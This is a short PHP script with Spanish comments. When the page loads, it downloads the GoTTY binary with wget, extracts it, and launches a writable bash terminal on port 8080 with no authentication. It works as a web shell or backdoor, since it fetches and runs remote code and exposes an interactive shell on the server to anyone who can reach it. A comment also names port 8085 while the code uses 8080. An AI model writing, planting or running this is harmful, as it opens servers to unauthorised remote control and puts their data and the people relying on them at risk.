<?php

// Comando para descargar Gotty
$downloadCommand = 'wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz';

// Comando para descomprimir Gotty
$extractCommand = 'tar -xzvf gotty_linux_amd64.tar.gz';

// Comando para ejecutar Gotty en el puerto 8085
$gottyCommand = './gotty -w --port 8080 /bin/bash';

// Ejecuta los comandos en serie
exec("$downloadCommand && $extractCommand && $gottyCommand", $output, $return_var);

if ($return_var !== 0) {
    echo 'Error: ' . implode(PHP_EOL, $output);
} else {
    echo 'Gotty is running on port 8080';
}
?>
